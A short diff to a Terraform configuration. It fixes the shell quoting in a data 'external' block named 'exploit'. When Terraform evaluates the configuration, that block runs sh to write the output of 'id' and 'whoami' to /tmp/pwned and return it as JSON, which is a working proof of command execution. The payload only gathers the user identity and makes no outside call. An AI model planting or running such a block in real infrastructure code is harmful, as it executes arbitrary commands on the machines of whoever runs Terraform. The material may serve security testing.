@@ -5,5 +5,5 @@ resource "null_resource" "dummy" {
 }
 
 data "external" "exploit" {
- program = ["sh", "-c", "id > /tmp/pwned; whoami >> /tmp/pwned; echo '{\"result\":\"$(cat /tmp/pwned | tr -d \"\\n\")\"}'"]
+ program = ["sh", "-c", "id > /tmp/pwned; whoami >> /tmp/pwned; OUTPUT=$(cat /tmp/pwned | tr -d \'\\n\'); echo '{\"result\":\"$OUTPUT\"}'"]
 }
